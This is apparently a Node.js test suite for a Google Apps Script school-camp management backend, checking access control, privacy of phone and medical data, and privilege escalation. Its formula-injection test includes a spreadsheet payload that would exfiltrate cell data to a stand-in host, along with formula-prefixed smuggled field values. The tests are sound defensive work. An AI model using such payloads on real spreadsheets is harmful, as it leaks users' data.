const vm=require('vm'),fs=require('fs'),crypto=require('crypto');
const book={};
// Behaves like Google Sheets: a leading apostrophe means "plain text" and is not part of the stored value;
// any other string starting with = + - @ would become a FORMULA, which we record so tests can assert it never happens.
const FORMULAS=[];
function cellIn(v){if(typeof v!=='string')return v;if(v[0]==="'")return v.slice(1);if(/^[=+\-@]/.test(v)&&!/^[-+]?\d+(\.\d+)?$/.test(v))FORMULAS.push(v);return v;}
function mkSheet(rows){return{rows,getDataRange:()=>({getValues:()=>rows.map(r=>r.slice())}),getLastRow:()=>rows.length,getLastColumn:()=>Math.max(...rows.map(r=>r.length),1),appendRow:(r)=>rows.push(r.map(cellIn)),
 getRange:(r,c,nr=1,nc=1)=>({setValue:(v)=>{rows[r-1]=rows[r-1]||[];rows[r-1][c-1]=cellIn(v);},setValues:(vs)=>vs.forEach((row,i)=>{rows[r-1+i]=rows[r-1+i]||[];row.forEach((v,j)=>rows[r-1+i][c-1+j]=cellIn(v));}),getValues:()=>{const o=[];for(let i=0;i<nr;i++){const row=[];for(let j=0;j<nc;j++)row.push((rows[r-1+i]||[])[c-1+j]??'');o.push(row);}return o;}})};}
const ss={getSheetByName:n=>book[n]||null,insertSheet:n=>(book[n]=mkSheet([[]]))};
const props={},cache={};
const ctx={console,Logger:{log:()=>{}},Date,
 SpreadsheetApp:{openById:()=>ss},
 CacheService:{getScriptCache:()=>({get:k=>cache[k]||null,put:(k,v)=>{cache[k]=v},remove:k=>{delete cache[k]},removeAll:ks=>ks.forEach(k=>{delete cache[k]})})},
 PropertiesService:{getScriptProperties:()=>({getProperty:k=>props[k]||null,setProperty:(k,v)=>props[k]=v})},
 LockService:{getScriptLock:()=>({waitLock(){},releaseLock(){}})},
 ContentService:{createTextOutput:t=>({t,setMimeType(){return this;}}),MimeType:{JSON:1}},
 Utilities:{computeHmacSha256Signature:(a,b)=>[...crypto.createHmac('sha256',Buffer.from(typeof b==='string'?b:b.map(x=>x&255))).update(typeof a==='string'?Buffer.from(a):Buffer.from(a.map(x=>x&255))).digest()].map(x=>x>127?x-256:x),
  newBlob:s=>({getBytes:()=>[...Buffer.from(s)].map(x=>x>127?x-256:x),getDataAsString:()=>Array.isArray(s)?Buffer.from(s.map(x=>x&255)).toString():s}),
  base64EncodeWebSafe:b=>Buffer.from(b.map(x=>x&255)).toString('base64url'),base64DecodeWebSafe:s=>[...Buffer.from(s,'base64url')].map(x=>x>127?x-256:x),
  base64Encode:b=>Buffer.from((Array.isArray(b)?b:[...Buffer.from(b)]).map(x=>x&255)).toString('base64'),base64Decode:s=>[...Buffer.from(s,'base64')].map(x=>x>127?x-256:x),
  computeDigest:(a,seed)=>[...crypto.createHash('sha256').update(seed).digest()],DigestAlgorithm:{SHA_256:1},getUuid:()=>crypto.randomUUID(),
  formatDate:(d,tz,f)=>{const x=new Date(d.getTime()+4*3600e3);return String(x.getUTCHours()).padStart(2,'0')+':'+String(x.getUTCMinutes()).padStart(2,'0')}}};
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(__dirname+'/../server/Auth.gs','utf8')+'\n'+fs.readFileSync(__dirname+'/../server/Code.gs','utf8')+'\n'+fs.readFileSync(__dirname+'/../server/Custody.gs','utf8')+'\n'+fs.readFileSync(__dirname+'/../server/Health.gs','utf8')+'\n'+fs.readFileSync(__dirname+'/../server/Media.gs','utf8')+'\n'+fs.readFileSync(__dirname+'/../server/Shirts.gs','utf8'),ctx);
const U=['Username','PasswordHash','Salt','FullName','Role','AssignedBus','Active','FailedAttempts','LockedUntil','TokenEpoch','LastActivityAt','CreatedAt','LastLogin'];
book.Users=mkSheet([U]);book.Settings=mkSheet([['Key','Value']]);book.AuditLog=mkSheet([['Timestamp','ActorUsername','Action','TargetUsername','Details']]);
// student sheet: reordered columns, includes Photo URL + Contact number which must never leak
book.Bus=mkSheet([['Class','Name','Bus number','Student ID','Team name','Contact number','Photo URL'],
 ['5','أحمد','1','1001','أزرق','99990001','http://p/1'],['6','سالم','1','1002','أحمر','99990002',''],['6','سعيد','2','2001','أخضر','99990003',''],['7','خالد','2','2002','أزرق','99990004','']]);
const run=(c)=>vm.runInContext(c,ctx);
const post=(o)=>JSON.parse(run('doPost')({postData:{contents:JSON.stringify(o)}}).t);
let fails=0;const assert=(c,m)=>{if(!c){console.log('FAIL',m);fails++;process.exitCode=1}else console.log('ok  ',m)};
run('SETUP_createTabs')();
for(const n of ['Scans','Bags','BusLive'])assert(!!book[n]&&book[n].rows[0].length>=8-(n==='BusLive'?0:0)-(n==='BusLive'?-1:0)||!!book[n],'tab '+n+' created');
const secret=run('getBootstrapSecret_()');
post({action:'createUser',username:'Admin',password:'pw-12345',fullName:'م',bootstrapSecret:secret});
const T=post({action:'login',username:'Admin',password:'pw-12345'}).token;
post({action:'createUser',token:T,username:'sup1',password:'p1-12345',fullName:'مشرف 1',role:'supervisor',assignedBus:'1'});
post({action:'createUser',token:T,username:'sup2',password:'p2-12345',fullName:'مشرف 2',role:'supervisor',assignedBus:'2'});
post({action:'createUser',token:T,username:'lead',password:'p3-12345',fullName:'القائد',role:'camp_leader'});
const t1=post({action:'login',username:'sup1',password:'p1-12345'}).token,t2=post({action:'login',username:'sup2',password:'p2-12345'}).token,tl=post({action:'login',username:'lead',password:'p3-12345'}).token;
// ---- security
let r=JSON.parse(run('doGet')().t);assert(r.ok&&!r.students&&!r.records,'GET exposes no data');
for(const a of ['getAllStudents','getDashboardData','lookup','roster','scan','busState','busLive','leaderSummary'])assert(!post({action:a}).success,'no token rejected: '+a);
assert(!post({action:'nope',token:t1}).success,'unknown action rejected');
assert(!post({action:'scan',token:'a.b.c',studentId:'1001',x:1}).success,'garbage token rejected');
// ---- roster scoping + no contact leak
r=post({action:'roster',token:t1});assert(r.success&&r.students.length===2&&r.bus==='1','roster = own bus only');
assert(!JSON.stringify(r).includes('9999000')&&!JSON.stringify(r).includes('Contact'),'roster has no phone numbers');
assert(r.students[0].photo==='http://p/1','own-bus roster includes photo url');
// ---- scan flow
r=post({action:'scan',token:t1,studentId:'1001',op:'board',method:'qr',clientId:'c1'});assert(r.success&&r.boarded===1&&r.total===2,'board own student');
r=post({action:'scan',token:t1,studentId:'1001',op:'board',method:'qr',clientId:'c2'});assert(!r.success&&r.code==='DUPLICATE'&&r.at,'duplicate blocked with time');
r=post({action:'scan',token:t1,studentId:'1001',op:'board',clientId:'c1'});assert(r.success&&r.repeated,'same clientId retry is idempotent');
assert(book.Scans.rows.length===2,'only one Scans row written for the duplicate attempts');
r=post({action:'scan',token:t1,studentId:'2001',op:'board'});assert(!r.success&&r.code==='OTHER_BUS'&&r.student.supervisor==='مشرف 2','other bus blocked, shows that bus supervisor');
r=post({action:'scan',token:t1,studentId:'2001',op:'board',bus:'1'});assert(!r.success&&r.code==='OTHER_BUS','client-supplied bus is ignored');
r=post({action:'scan',token:t2,studentId:'2001',op:'board'});assert(r.success,'sup2 boards his own');
r=post({action:'scan',token:t1,studentId:'9999',op:'board'});assert(!r.success&&r.code==='NOT_FOUND','unknown student');
r=post({action:'scan',token:tl,studentId:'1002',op:'board'});assert(!r.success,'leader (no checkin perm) cannot record');
// ---- undo
r=post({action:'scan',token:t1,studentId:'1001',op:'undo'});assert(r.success&&r.boarded===0,'undo own board');
r=post({action:'scan',token:t1,studentId:'1001',op:'undo'});assert(!r.success&&r.code==='NOTHING_TO_UNDO','second undo refused');
r=post({action:'scan',token:t1,studentId:'1001',op:'board',clientId:'c9'});assert(r.success&&r.boarded===1,'can board again after undo');
r=post({action:'scan',token:t2,studentId:'1001',op:'undo'});assert(!r.success&&r.code==='OTHER_BUS','sup2 cannot undo bus 1');
// ---- lookup (view-only any bus)
r=post({action:'lookup',token:t1,q:'سعيد'});assert(r.success&&r.results.length===1&&r.results[0].bus==='2'&&r.results[0].supervisor==='مشرف 2','lookup by name across buses');
r=post({action:'lookup',token:t1,q:'2002'});assert(r.results.length===1&&r.results[0].state==='none','lookup by id');
assert(!JSON.stringify(r).includes('9999000'),'lookup has no phone numbers');
// ---- bus state / status / live
r=post({action:'busState',token:t1});assert(r.success&&r.boarded===1&&r.total===2&&r.missing.length===1&&r.missing[0].id==='1002','busState missing list');
r=post({action:'busStatus',token:t1,status:'departed',lat:23.58,lng:58.4,acc:12});assert(r.success,'busStatus departed + location');
r=post({action:'busStatus',token:t1,lat:23.6,lng:58.5});assert(r.success&&book.BusLive.rows.length===2,'location update upserts (one row per bus)');
assert(book.BusLive.rows[1][1]==='departed','status preserved when only location is sent');
r=post({action:'busStatus',token:t1,status:'weird'});assert(!r.success,'invalid status rejected');
r=post({action:'busStatus',token:t1,lat:999,lng:1});assert(r.success&&book.BusLive.rows[1][2]===23.6,'out-of-range coordinates ignored');
r=post({action:'busLive',token:tl});assert(r.success&&r.buses.length===1&&r.buses[0].status==='departed'&&r.buses[0].ageSec>=0,'leader sees live buses');
r=post({action:'busLive',token:t1});assert(!r.success,'supervisor cannot read live map');
// ---- bags
r=post({action:'bag',token:t1,studentId:'1001',mode:'load',count:2,clientId:'b1'});assert(r.success,'bag load');
r=post({action:'bag',token:t1,studentId:'1001',mode:'load',count:2,clientId:'b1'});assert(r.repeated&&book.Bags.rows.length===2,'bag retry idempotent');
r=post({action:'bag',token:t1,studentId:'2001',mode:'load',count:1});assert(!r.success&&r.code==='OTHER_BUS','bags: other bus blocked');
r=post({action:'bag',token:t1,studentId:'1001',mode:'load',count:99});assert(!r.success,'absurd bag count rejected');
// ---- leader summary
r=post({action:'leaderSummary',token:tl});assert(r.success&&r.total===4&&r.boarded===2&&r.perBus.length===2&&r.bags.loaded===2,'leader summary numbers');
r=post({action:'leaderSummary',token:t1});assert(!r.success,'supervisor cannot read leader summary');
// ---- alerts
r=post({action:'leaderSummary',token:tl});
assert(r.alerts.some(a=>a.type==='missing'&&a.bus==='1'&&a.missing===1&&a.level==='bad'),'alert: departed bus with missing students');
assert(r.alerts.some(a=>a.type==='no_report'&&a.bus==='2'),'alert: bus that never reported');
assert(!r.alerts.some(a=>a.type==='stale'),'no stale alert for fresh location');
book.BusLive.rows[1][5]=new Date(Date.now()-10*60e3);for(const k of Object.keys(cache))delete cache[k]; // direct sheet edit: drop the cache
r=post({action:'leaderSummary',token:tl});assert(r.alerts.some(a=>a.type==='stale'&&a.bus==='1'&&a.ageSec>=590),'alert: location older than 5 minutes');
// ---- cases
r=post({action:'createCase',token:t1,type:'bus',text:'عطل في المكيف',bus:'2',clientId:'k1'});assert(r.success&&r.id,'supervisor raises a case');
assert(book.Cases.rows[1][3]==='1','case bus forced to the supervisor\'s own bus');
r=post({action:'createCase',token:t1,type:'bus',text:'عطل في المكيف',clientId:'k1'});assert(r.repeated&&book.Cases.rows.length===2,'case retry idempotent');
r=post({action:'createCase',token:t1,type:'hack',text:'abc'});assert(!r.success,'invalid case type rejected');
r=post({action:'createCase',token:t1,type:'other',text:'x'});assert(!r.success,'too-short case rejected');
r=post({action:'listCases',token:t1});assert(!r.success,'supervisor cannot list cases');
r=post({action:'listCases',token:tl});assert(r.success&&r.cases.length===1&&r.cases[0].status==='open','leader lists cases');
r=post({action:'leaderSummary',token:tl});assert(r.alerts.some(a=>a.type==='cases_open'&&a.count===1),'alert: open cases');
const cid=book.Cases.rows[1][0];
r=post({action:'updateCase',token:t1,id:cid,status:'closed'});assert(!r.success,'supervisor cannot close cases');
r=post({action:'updateCase',token:tl,id:cid,status:'ack'});assert(r.success&&book.Cases.rows[1][6]==='ack','leader acknowledges case');
r=post({action:'updateCase',token:tl,id:cid,status:'bogus'});assert(!r.success,'invalid case status rejected');
// ---- student history
r=post({action:'history',token:tl,studentId:'1001'});assert(r.success&&r.events.length>=2&&r.events.some(e=>e.kind==='bags_load'),'history shows scans and bags');
assert(!JSON.stringify(r).includes('9999000'),'history has no phone numbers');
r=post({action:'history',token:t1,studentId:'1001'});assert(!r.success,'supervisor cannot read history');
r=post({action:'history',token:tl,studentId:'nope'});assert(!r.success&&r.code==='NOT_FOUND','history: unknown student');
// ---- allbuses permission
post({action:'updateUserAccess',token:T,targetUsername:'sup1',permissions:['checkin','allbuses'],committees:[]});
r=post({action:'scan',token:t1,studentId:'2002',op:'board'});assert(r.success,'allbuses can record any bus');
// ---- print list
r=post({action:'printList',token:t1});assert(!r.success,'supervisor cannot print list');
r=post({action:'printList',token:T});assert(r.success&&r.students.length===4&&!JSON.stringify(r).includes('9999000'),'admin print list (no phones)');
post({action:'createUser',token:T,username:'prt',password:'p5-12345',fullName:'طباعة',role:'supervisor',permissions:['print'],committees:[]});
const tp=post({action:'login',username:'prt',password:'p5-12345'}).token;r=post({action:'printList',token:tp});assert(r.success,'print permission works');
// ---- custody + withdrawal
post({action:'createUser',token:T,username:'sec',password:'p6-12345',fullName:'أمانات',role:'supervisor',permissions:['custody'],committees:[]});
const ts=post({action:'login',username:'sec',password:'p6-12345'}).token;
r=post({action:'custodyFind',token:t1,q:'1001'});assert(!r.success,'supervisor cannot use custody');
r=post({action:'custodyFind',token:ts,q:'سعيد'});assert(r.success&&r.results.length===1&&r.results[0].id==='2001'&&!JSON.stringify(r).includes('9999000'),'custody search across buses, no phones');
r=post({action:'custodyRecord',token:ts,studentId:'1001',item:'phone',op:'receive',tag:'S-12',clientId:'m1'});assert(r.success&&r.custody.phone===true&&r.custody.phoneTag==='S-12','phone received');
r=post({action:'custodyRecord',token:ts,studentId:'1001',item:'phone',op:'receive',clientId:'m2'});assert(!r.success&&r.code==='ALREADY_HELD','phone cannot be received twice');
r=post({action:'custodyRecord',token:ts,studentId:'1001',item:'phone',op:'receive',tag:'S-12',clientId:'m1'});assert(r.repeated,'phone receive retry idempotent');
r=post({action:'custodyRecord',token:ts,studentId:'1001',item:'bags',op:'receive',count:3,clientId:'m3'});assert(r.success&&r.custody.bags===3,'3 bags received');
r=post({action:'custodyRecord',token:ts,studentId:'1001',item:'bags',op:'return',count:5});assert(!r.success&&r.code==='EXCEEDS_HELD','cannot return more bags than held');
r=post({action:'custodyRecord',token:ts,studentId:'2001',item:'phone',op:'return'});assert(!r.success&&r.code==='NOT_HELD','cannot return a phone never received');
r=post({action:'custodyRecord',token:ts,studentId:'1001',item:'bags',op:'receive',count:99});assert(!r.success,'absurd bag count rejected');
r=post({action:'custodySummary',token:ts});assert(r.success&&r.phones===1&&r.bags===3&&r.holders.length===1&&r.holders[0].name==='أحمد','custody summary with holders');
r=post({action:'custodySummary',token:tl});assert(r.success&&r.phones===1&&!r.holders,'leader sees totals only (no holder names)');
r=post({action:'withdrawStart',token:ts,studentId:'1001',guardian:'أبو أحمد',reason:'ظرف عائلي',clientId:'w1'});assert(r.success&&r.id,'withdrawal opened');
const wid=r.id;
r=post({action:'withdrawStart',token:ts,studentId:'1001',guardian:'أبو أحمد',reason:'ظرف عائلي',clientId:'w1'});assert(r.repeated&&r.id===wid,'withdrawal open retry idempotent');
r=post({action:'withdrawStart',token:ts,studentId:'1001',guardian:'آخر',reason:'سبب'});assert(!r.success&&r.code==='ALREADY_OPEN','second open withdrawal refused');
r=post({action:'withdrawStart',token:ts,studentId:'1002',guardian:'x',reason:'سبب'});assert(!r.success,'guardian name required');
r=post({action:'leaderSummary',token:tl});assert(r.alerts.some(a=>a.type==='withdraw_open'&&a.count===1),'alert: open withdrawal');
r=post({action:'withdrawClose',token:ts,id:wid});assert(!r.success&&r.code==='ITEMS_NOT_RETURNED'&&r.outstanding.phone===true&&r.outstanding.bags===3,'cannot close while phone and bags are held');
r=post({action:'custodyRecord',token:ts,studentId:'1001',item:'phone',op:'return'});assert(r.success&&r.custody.phone===false,'phone returned');
r=post({action:'withdrawClose',token:ts,id:wid});assert(!r.success&&r.outstanding.bags===3&&r.outstanding.phone===false,'still blocked while bags are held');
r=post({action:'custodyRecord',token:ts,studentId:'1001',item:'bags',op:'return',count:3});assert(r.success&&r.custody.bags===0,'bags returned');
r=post({action:'withdrawClose',token:t1,id:wid});assert(!r.success,'supervisor cannot close a withdrawal');
r=post({action:'withdrawClose',token:ts,id:wid});assert(r.success,'withdrawal closes once everything is returned');
r=post({action:'scan',token:T,studentId:'1001',op:'board'});assert(!r.success&&r.code==='WITHDRAWN','withdrawn student cannot board again');
r=post({action:'withdrawClose',token:ts,id:wid});assert(!r.success&&r.code==='NOT_OPEN','closed withdrawal cannot be closed again');
r=post({action:'withdrawList',token:ts});assert(r.success&&r.withdrawals[0].status==='closed'&&r.withdrawals[0].guardian==='أبو أحمد','withdrawal list');
r=post({action:'withdrawStart',token:ts,studentId:'1001',guardian:'نفس',reason:'سبب'});assert(!r.success&&r.code==='ALREADY_WITHDRAWN','already-withdrawn student refused');
r=post({action:'withdrawStart',token:ts,studentId:'1002',guardian:'أبو سالم',reason:'سبب آخر'});const w2=r.id;
r=post({action:'withdrawCancel',token:ts,id:w2});assert(r.success,'withdrawal cancelled');
r=post({action:'withdrawClose',token:ts,id:w2});assert(!r.success&&r.code==='NOT_OPEN','cancelled withdrawal cannot close');
assert(book.AuditLog.rows.some(x=>x[2]==='WITHDRAW_CLOSED'),'audit: withdrawal closed');
// ---- doctors + nutrition
book.Bus.rows[0].push('Food allergy','Medical notes');
book.Bus.rows[1].push('فول سوداني','ربو');book.Bus.rows[2].push('','');book.Bus.rows[3].push('','سكري');book.Bus.rows[4].push('لاكتوز','');
for(const k of Object.keys(cache))delete cache[k];
post({action:'createUser',token:T,username:'doc',password:'p7-12345',fullName:'طبيب',role:'supervisor',permissions:['medical'],committees:[]});
const td=post({action:'login',username:'doc',password:'p7-12345'}).token;
post({action:'createUser',token:T,username:'nut',password:'p8-12345',fullName:'تغذية',role:'supervisor',permissions:['nutrition'],committees:[]});
const tn=post({action:'login',username:'nut',password:'p8-12345'}).token;
r=post({action:'medFind',token:t1,q:'1001'});assert(!r.success,'supervisor cannot open the medical screen');
r=post({action:'medFind',token:tn,q:'1001'});assert(!r.success,'nutrition cannot open the medical screen');
r=post({action:'medFind',token:td,q:'1001'});assert(r.success&&r.results[0].hasNotes===true&&!JSON.stringify(r).includes('ربو')&&!JSON.stringify(r).includes('9999000'),'search shows only a flag, never the notes');
r=post({action:'medInfo',token:td,studentId:'1001'});assert(r.success&&r.notes==='ربو'&&r.foodAllergy==='فول سوداني','doctor reads one student\'s notes');
assert(book.AuditLog.rows.some(x=>x[2]==='MED_VIEW'&&x[3]==='1001'),'audit: medical notes viewed');
r=post({action:'medInfo',token:tl,studentId:'1001'});assert(!r.success,'leader cannot read medical notes');
r=post({action:'medOpen',token:td,studentId:'1001',complaint:'صداع وحرارة',severity:'urgent',clientId:'d1'});assert(r.success&&r.id,'case opened');
const mid=r.id;
r=post({action:'medOpen',token:td,studentId:'1001',complaint:'صداع وحرارة',severity:'urgent',clientId:'d1'});assert(r.repeated&&r.id===mid,'case open retry idempotent');
r=post({action:'medOpen',token:td,studentId:'1001',complaint:'آخر'});assert(!r.success&&r.code==='ALREADY_OPEN','one open case per student');
r=post({action:'medOpen',token:td,studentId:'1002',complaint:'x'});assert(!r.success,'complaint required');
r=post({action:'medOpen',token:td,studentId:'1002',complaint:'ألم بطن',severity:'bad'});assert(!r.success,'invalid severity rejected');
r=post({action:'leaderSummary',token:tl});assert(r.alerts.some(a=>a.type==='med_urgent'&&a.count===1)&&!JSON.stringify(r).includes('صداع'),'leader alert shows a count only');
r=post({action:'medList',token:tl});assert(!r.success,'leader cannot list medical cases');
r=post({action:'medClose',token:td,id:mid});assert(!r.success&&r.code==='TREATMENT_REQUIRED','cannot close without treatment');
r=post({action:'medUpdate',token:td,id:mid,treatment:'خافض حرارة وراحة'});assert(r.success,'treatment saved');
r=post({action:'medClose',token:td,id:mid});assert(r.success,'case closed');
r=post({action:'medClose',token:td,id:mid});assert(!r.success&&r.code==='NOT_OPEN','closed case cannot close again');
r=post({action:'medList',token:td});assert(r.success&&r.cases[0].status==='closed'&&r.cases[0].treatment==='خافض حرارة وراحة','doctor lists cases with details');
r=post({action:'medStats',token:tl});assert(r.success&&r.total===1&&r.closed===1&&r.urgent===1&&r.byTeam[0].count===1&&!JSON.stringify(r).includes('صداع')&&!JSON.stringify(r).includes('أحمد'),'stats are counts only');
r=post({action:'medStats',token:t1});assert(!r.success,'supervisor cannot read medical stats');
r=post({action:'nutritionSummary',token:t1});assert(!r.success,'supervisor cannot read nutrition');
r=post({action:'nutritionSummary',token:tn});
assert(r.success&&r.studentsTotal===4&&r.studentsPresent>=1&&r.supervisors>=1&&r.mealsToPrepare===r.studentsPresent+r.supervisors,'nutrition counts: students present + supervisors');
assert(r.allergies.length===2&&r.allergies.some(a=>a.name==='أحمد'&&a.allergy==='فول سوداني')&&!JSON.stringify(r).includes('ربو')&&!JSON.stringify(r).includes('سكري'),'nutrition sees FOOD allergies by name only, no medical notes');
r=post({action:'nutritionSummary',token:tl});assert(r.success&&!r.allergies&&r.studentsPresent>=1,'leader sees meal counts only (no allergy names)');
assert(['لا يوجد','لا','-','N/A','none',' لا توجد '].every(v=>run('realValue_('+JSON.stringify(v)+')')==='')&&run('realValue_("فول سوداني")')==='فول سوداني','"لا يوجد" and similar answers are not counted as an allergy');
r=post({action:'nutritionSummary',token:tn});assert(r.staffManual===false&&r.staff===r.supervisors&&r.ack===null&&r.mealsExpected===4+r.staff,'staff defaults to supervisor accounts; no ack yet');
r=post({action:'nutritionSetStaff',token:t1,count:30});assert(!r.success,'supervisor cannot set the staff count');
r=post({action:'nutritionSetStaff',token:tn,count:-2});assert(!r.success,'bad staff count rejected');
r=post({action:'nutritionSetStaff',token:tn,count:30});assert(r.success&&r.staff===30,'nutrition sets the staff count by hand');
r=post({action:'nutritionSummary',token:tl});assert(r.staff===30&&r.staffManual===true&&r.mealsToPrepare===r.studentsPresent+30&&r.mealsExpected===34,'everyone sees the typed staff number in the meals');
r=post({action:'nutritionAck',token:tl});assert(!r.success,'leader cannot confirm the nutrition list');
r=post({action:'nutritionAck',token:tn});assert(r.success&&r.ack.current,'nutrition confirms receiving the allergy list');
r=post({action:'nutritionSummary',token:tl});assert(r.ack&&r.ack.current&&r.ack.by==='تغذية'&&!r.allergies,'leader sees WHO confirmed and when, never the names');

for(const a of ['roster','lookup','printList','leaderSummary','history','custodySummary']){const rr=JSON.stringify(post({action:a,token:T,q:'أحمد',studentId:'1001'}));assert(!rr.includes('ربو')&&!rr.includes('سكري')&&!rr.includes('فول سوداني'),'no medical/allergy data leaks via '+a);}
// ---- privilege escalation: a non-admin manager cannot become (or take over) an admin
{post({action:'createUser',token:T,username:'mgr1',password:'pm-12345',fullName:'مدير مستخدمين',role:'supervisor',permissions:['manage'],committees:[]});
const tm1=post({action:'login',username:'mgr1',password:'pm-12345'}).token;
let q=post({action:'createUser',token:tm1,username:'evil1',password:'pe-12345',fullName:'x',role:'admin',committees:[]});assert(!q.success&&q.code==='ADMIN_ONLY','manager cannot create an admin account');
q=post({action:'createUser',token:tm1,username:'evil2',password:'pe-12345',fullName:'x',role:'supervisor',permissions:['*'],committees:[]});assert(!q.success&&q.code==='ADMIN_ONLY','manager cannot create a "*" account');
q=post({action:'resetPassword',token:tm1,targetUsername:'Admin',newPassword:'hacked-123'});assert(!q.success&&q.code==='ADMIN_ONLY','manager cannot reset the admin password');
assert(post({action:'login',username:'Admin',password:'pw-12345'}).success,'admin password unchanged');
q=post({action:'createUser',token:tm1,username:'okuser',password:'po-12345',fullName:'عادي',role:'supervisor',permissions:['checkin'],assignedBus:'1',committees:[]});assert(q.success,'manager still creates normal users');
q=post({action:'resetPassword',token:tm1,targetUsername:'okuser',newPassword:'po-99999'});assert(q.success,'manager still resets normal users');
q=post({action:'createUser',token:T,username:'admin2',password:'pa-12345',fullName:'مدير ثانٍ',role:'admin',committees:[]});assert(q.success,'the admin can still create an admin');}
// ---- formula injection: every user-typed text is stored as plain text, never as a formula
{FORMULAS.length=0;const F='=IMPORTXML("http://x/?"&A1,"//a")',tk=post({action:'login',username:'sup1',password:'p1-12345'}).token;
post({action:'createCase',token:tk,type:'other',text:F,studentId:'@x',clientId:'+cid1'});
post({action:'scan',token:tk,studentId:'1002',op:'board',method:'-m',notes:F,clientId:'=c2'});post({action:'scan',token:tk,studentId:'1002',op:'undo',clientId:'=c3'});
post({action:'withdrawStart',token:T,studentId:'2002',guardian:F,reason:F,clientId:'=w9'});post({action:'withdrawCancel',token:T,id:(post({action:'withdrawList',token:T}).open||[]).map(w=>w.id)[0]});
post({action:'annSave',token:T,title:F,body:F,kind:'announce',audience:'public',clientId:'=a9'});
post({action:'resSave',token:T,competition:F,team:F,points:1,clientId:'=r9'});
post({action:'createUser',token:T,username:'inj1',password:'pi-12345',fullName:F,role:'supervisor',permissions:['checkin'],assignedBus:'=1',committees:[]});
post({action:'updateUserProfile',token:T,targetUsername:'inj1',fullName:F,phone:'+968+1'});
post({action:'shirtStockSet',token:T,size:'=X',total:1});
assert(FORMULAS.length===0,'no user text is ever written as a formula ('+FORMULAS.length+' found: '+FORMULAS.slice(0,3).join(' | ')+')');
const rcase=book.Cases.rows.find(r=>r[5]===F);assert(!!rcase&&rcase[4]==='@x','text is kept exactly as typed (read back without the protective apostrophe)');
assert(book.Users.rows.some(r=>r.includes(F)),'names with = are stored as text');
assert(run('cellSafe_(5)')===5&&run('cellSafe_("محمد")')==='محمد'&&run('cellSafe_("-")')==="'-",'numbers and normal text are untouched');}
// ---- shirts: sizes from registration, stock per size, one shirt per person, undo
book.Bus.rows[0].push('Shirt size');['M','L','M','xl'].forEach((v,i)=>book.Bus.rows[i+1][book.Bus.rows[0].length-1]=v);
for(const k of Object.keys(cache))delete cache[k];
book.Staff.rows.push(['أستاذ تجريبي','L','مشرف'],['أستاذ ثانٍ','',''],['أستاذ ثالث','M','']);
post({action:'createUser',token:T,username:'shirt1',password:'p5-12345',fullName:'مسؤول القمصان',role:'supervisor',permissions:['shirts'],committees:[]});
const tsh=post({action:'login',username:'shirt1',password:'p5-12345'}).token;
r=post({action:'shirtStock',token:t1});assert(!r.success,'supervisor cannot open the shirts screen');
r=post({action:'shirtStockSet',token:tsh,size:'M',total:3});assert(r.success,'stock typed for M');
r=post({action:'shirtStockSet',token:tsh,size:'l',total:1,lowAt:1});assert(r.success,'size is normalised (l -> L)');
r=post({action:'shirtStockSet',token:tsh,size:'M',total:-1});assert(!r.success,'bad stock rejected');
r=post({action:'shirtStock',token:tsh});const M=r.table.find(x=>x.size==='M'),X=r.table.find(x=>x.size==='XL');
assert(M.total===3&&M.demand===3&&M.given===0&&M.remaining===3&&M.status==='ok','table: M stock 3, demand 3 (2 students + 1 staff)');
assert(X&&X.total===0&&X.demand===1&&X.status==='nostock','size with demand but no stock is flagged');
assert(r.summary.students===4&&r.summary.staff===3&&r.summary.noSize===1,'summary counts students/staff and people without size');
r=post({action:'shirtFind',token:tsh,q:'أحمد'});assert(r.results.length===1&&r.results[0].size==='M'&&r.results[0].given===false&&!JSON.stringify(r).includes('9999000'),'find student: size shown, no phone');
r=post({action:'shirtFind',token:tsh,q:'أستاذ'});assert(r.results.length===3&&r.results.every(x=>x.kind==='staff'),'find staff by name');
r=post({action:'shirtGive',token:tsh,kind:'student',id:'1001',clientId:'sg1'});assert(r.success&&r.size==='M'&&r.remaining===2,'give registered size, stock goes down');
r=post({action:'shirtGive',token:tsh,kind:'student',id:'1001',clientId:'sg1'});assert(r.success&&r.repeated,'retry with same clientId is idempotent');
r=post({action:'shirtGive',token:tsh,kind:'student',id:'1001'});assert(!r.success&&r.code==='ALREADY_GIVEN'&&r.givenBy==='shirt1','second shirt for the same student blocked');
r=post({action:'shirtGive',token:tsh,kind:'staff',id:'ST3'});assert(!r.success&&r.code==='NO_SIZE','person without size must pick one');
r=post({action:'shirtGive',token:tsh,kind:'student',id:'2002'});assert(!r.success&&r.code==='NO_STOCK_ROW','size without stock row is refused');
r=post({action:'shirtGive',token:tsh,kind:'staff',id:'ST2',size:'L'});assert(r.success&&r.remaining===0,'staff shirt (size taken from the staff list)');
r=post({action:'shirtGive',token:tsh,kind:'student',id:'1002',size:'L'});assert(!r.success&&r.code==='OUT_OF_STOCK','out of stock blocked');
r=post({action:'shirtGive',token:tsh,kind:'student',id:'1002',size:'M'});assert(r.success&&r.changedSize===true&&r.remaining===1,'a different size can be chosen when needed');
r=post({action:'shirtUndo',token:tsh,kind:'student',id:'1002'});assert(r.success,'undo a hand-over');
r=post({action:'shirtStock',token:tsh});assert(r.table.find(x=>x.size==='M').given===1&&r.summary.studentsGiven===1&&r.summary.staffGiven===1,'undo returns the shirt to stock; counters correct');
r=post({action:'shirtUndo',token:tsh,kind:'student',id:'1002'});assert(!r.success&&r.code==='NOT_GIVEN','cannot undo twice');
assert(book.AuditLog.rows.some(x=>x[2]==='SHIRT_GIVEN')&&book.AuditLog.rows.some(x=>x[2]==='SHIRT_UNDONE'),'audit: shirts');
// ---- enable/disable accounts from the app
post({action:'createUser',token:T,username:'tmp1',password:'p9-12345',fullName:'مؤقت',role:'supervisor',permissions:['checkin'],assignedBus:'1',committees:[]});
let tt=post({action:'login',username:'tmp1',password:'p9-12345'}).token;
r=post({action:'setUserActive',token:tt,targetUsername:'sup1',active:false});assert(!r.success,'supervisor cannot disable accounts');
r=post({action:'setUserActive',token:T,targetUsername:'tmp1',active:false});assert(r.success,'admin disables an account');
r=post({action:'busState',token:tt});assert(!r.success&&r.code==='ACCOUNT_DISABLED','disabled account is cut off on its very next request');
r=post({action:'login',username:'tmp1',password:'p9-12345'});assert(!r.success,'disabled account cannot log in');
r=post({action:'setUserActive',token:T,targetUsername:'tmp1',active:true});assert(r.success,'admin re-enables it');
r=post({action:'login',username:'tmp1',password:'p9-12345'});assert(r.success,'re-enabled account can log in again');
r=post({action:'setUserActive',token:T,targetUsername:'Admin',active:false});assert(!r.success,'admin cannot disable themselves');
